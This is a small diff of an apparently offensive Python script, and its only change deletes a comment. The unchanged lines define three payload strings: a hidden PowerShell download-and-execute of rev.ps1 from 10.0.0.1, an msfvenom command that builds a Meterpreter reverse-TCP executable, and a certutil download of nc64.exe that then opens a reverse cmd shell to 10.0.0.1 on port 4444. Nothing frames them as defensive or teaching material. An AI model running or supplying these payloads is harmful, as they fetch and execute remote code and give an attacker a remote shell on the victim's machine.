@@ -2,8 +2,6 @@ import os
 import subprocess
 import socket
 
-# omer
-
 payload1 = "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/rev.ps1')\""
 payload2 = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe"
 payload3 = "certutil -urlcache -split -f http://10.0.0.1/nc64.exe nc64.exe && nc64.exe 10.0.0.1 4444 -e cmd"
